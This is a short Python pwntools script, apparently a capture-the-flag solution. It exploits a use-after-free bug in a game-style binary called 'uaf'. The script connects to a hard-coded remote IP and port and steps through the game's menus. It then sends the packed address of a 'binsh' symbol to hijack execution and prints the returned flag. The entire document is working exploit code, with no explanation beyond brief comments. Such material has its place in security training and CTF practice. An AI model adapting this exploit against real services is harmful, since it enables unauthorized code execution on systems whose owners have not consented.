from pwn import *
binary_path = './uaf'
e = ELF(binary_path)
binsh_addr = e.symbols['binsh']
log.info('binsh : ' + hex(binsh_addr))
r = remote('121.170.91.13', 10101)
print r.recv()
print r.recv()[1:]
# menu
r.sendline('2')
log.info(2)
print r.recv()
r.sendline('100')
log.info(100)
# set damage to 100
print r.recv()
print r.recv()[1:]    
# menu
r.sendline('1')
log.info(1)
print r.recv()
print r.recv()[1:]
# fight menu
r.sendline('1')
log.info(1)
# hit
print r.recv()
print r.recv()[1:]
# receive output
r.sendline(p32(binsh_addr))
log.info(p32(binsh_addr))
print r.recv()
print r.recv()[1:]    
# menu
r.sendline('1')
log.info(1)
flag = r.recv()
print flag
log.info('FLAG : ' + flag)
